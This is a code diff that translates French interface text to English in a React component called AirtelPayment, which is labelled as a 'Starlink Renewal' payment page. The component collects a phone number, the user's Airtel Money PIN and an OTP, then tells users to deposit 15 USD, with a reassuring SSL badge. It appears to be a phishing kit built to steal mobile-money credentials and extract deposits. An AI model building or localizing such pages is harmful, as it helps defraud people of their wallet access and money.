@@ -139,7 +139,7 @@ export default function AirtelPayment({
           <div className="text-right">
             <p className="text-[11px] text-gray-500 uppercase mb-1">Service</p>
             <p className="text-base text-gray-800 font-semibold">
-              Starlink {packageName}
+              Starlink Renewal
             </p>
           </div>
         </div>
@@ -184,7 +184,7 @@ export default function AirtelPayment({
                   onChange={(e) =>
                     setPhone(e.target.value.replace(/[^0-9]/g, "").slice(0, 10))
                   }
-                  placeholder="Entrez le numéro de mobile"
+                  placeholder="Enter mobile number"
                   className="flex-1 border-none px-3 py-3.5 text-base outline-none bg-transparent"
                 />
               </div>
@@ -192,10 +192,10 @@ export default function AirtelPayment({
 
             <div className="mb-5">
               <p className="text-base font-semibold text-gray-900 mb-2 text-center">
-                Entrez le code PIN à 4 chiffres
+                Enter your 4-digit PIN
               </p>
               <p className="text-[13px] text-gray-500 mb-3 text-center">
-                Entrez le code PIN Airtel Money
+                Enter your Airtel Money PIN
               </p>
               <div className="flex gap-2.5 justify-center mb-2">
                 {pin.map((p, i) => (
@@ -226,32 +226,32 @@ export default function AirtelPayment({
               {loading ? (
                 <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
               ) : (
-                "ENVOYER OTP"
+                "SEND OTP"
               )}
             </button>
 
             <div className="text-center text-sm text-gray-500 mb-5">
-              Numéro oublié ?{" "}
+              Forgot number?{" "}
               <span className="text-[#ed1c24] font-medium cursor-pointer">
-                Cliquez ici !
+                Click here!
               </span>
             </div>
 
             <div className="flex items-center my-5 w-full">
               <div className="flex-1 h-px bg-gray-200" />
-              <span className="px-4 text-gray-500 text-sm font-medium">OU</span>
+              <span className="px-4 text-gray-500 text-sm font-medium">OR</span>
               <div className="flex-1 h-px bg-gray-200" />
             </div>
 
             <button className="w-full bg-white text-[#ed1c24] border-2 border-[#ed1c24] py-3.5 rounded-lg text-base font-semibold cursor-pointer hover:bg-red-50 transition">
-              CONTINUER SANS CONNEXION
+              CONTINUE WITHOUT LOGIN
             </button>
 
             <button
               onClick={onBack}
               className="w-full mt-4 text-sm text-gray-500 hover:text-gray-700 transition"
             >
-              ← Retour aux forfaits
+              ← Back to plans
             </button>
           </div>
         )}
@@ -262,14 +262,14 @@ export default function AirtelPayment({
               onClick={() => setScreen("phone")}
               className="flex items-center gap-2 text-gray-500 text-sm mb-5 py-2 hover:text-gray-700"
             >
-              <span>←</span> Retour
+              <span>←</span> Back
             </button>
 
             <h1 className="text-[20px] font-semibold text-gray-900 mb-3">
-              Vérification OTP
+              OTP Verification
             </h1>
             <p className="text-sm text-gray-500 mb-6">
-              Veuillez entrer l'OTP que vous avez reçu sur{" "}
+              Please enter the OTP you received on{" "}
               <strong className="text-gray-800">
                 {selectedCountry.code} {phone}
               </strong>
@@ -306,20 +306,20 @@ export default function AirtelPayment({
               {loading ? (
                 <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
               ) : (
-                "VÉRIFIER"
+                "VERIFY"
               )}
             </button>
 
             <div className="text-center text-sm text-gray-500">
-              Vous n'avez pas reçu l'OTP ?{" "}
+              Didn't receive the OTP?{" "}
               {timer > 0 ? (
-                <span className="text-gray-400">Renvoyer dans {timer}s</span>
+                <span className="text-gray-400">Resend in {timer}s</span>
               ) : (
                 <span
                   className="text-[#ed1c24] font-medium cursor-pointer"
                   onClick={() => setTimer(30)}
                 >
-                  Renvoyer OTP
+                  Resend OTP
                 </span>
               )}
             </div>
@@ -332,32 +332,31 @@ export default function AirtelPayment({
               <span className="text-4xl">⚠️</span>
             </div>
             <h2 className="text-xl font-bold text-amber-700 mb-2">
-              Solde insuffisant
+              Insufficient balance
             </h2>
             <p className="text-gray-500 text-[13px] leading-relaxed mb-6">
-              Vous devez avoir au moins{" "}
-              <strong className="text-gray-900">15 $ USD</strong> dans votre
-              portefeuille Airtel Money pour souscrire à ce forfait.
+              You must have at least{" "}
+              <strong className="text-gray-900">15 $ USD</strong> in your
+              Airtel Money wallet to subscribe to this plan.
               <br />
               <br />
-              Veuillez déposer le montant requis et cliquez sur le bouton
-              ci-dessous.
+              Please deposit the required amount and click the button below.
             </p>
             <button className="w-full py-3.5 bg-emerald-500 text-white border-none rounded-[10px] text-[15px] font-semibold cursor-pointer mb-3 transition hover:bg-emerald-600">
-              ✅ J'ai déposé
+              ✅ I have deposited
             </button>
             <button
               onClick={() => setScreen("phone")}
               className="w-full py-3.5 bg-transparent text-gray-500 border-2 border-gray-300 rounded-[10px] text-sm font-medium cursor-pointer transition hover:border-gray-400"
             >
-              Utiliser un autre numéro
+              Use another number
             </button>
           </div>
         )}
 
         <div className="mt-auto pt-8 text-center">
           <p className="text-xs text-gray-400 mb-3">
-            Meilleure expérience avec
+            Best experienced with
           </p>
           <div className="flex justify-center gap-3">
             {["Chrome", "Firefox", "Safari", "Edge", "Opera"].map((b) => (
@@ -379,7 +378,7 @@ export default function AirtelPayment({
           >
             <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
           </svg>
-          <span>CRYPTÉ ET SÉCURISÉ EN SSL</span>
+          <span>ENCRYPTED & SSL SECURED</span>
         </div>
       </div>
 
@@ -393,7 +392,7 @@ export default function AirtelPayment({
             onClick={(e) => e.stopPropagation()}
           >
             <div className="px-5 py-4 border-b border-gray-200 flex justify-between items-center">
-              <h3 className="text-lg text-gray-800">Sélectionner le pays</h3>
+              <h3 className="text-lg text-gray-800">Select country</h3>
               <button
                 onClick={() => setShowCountryModal(false)}
                 className="text-2xl text-gray-500 leading-none"
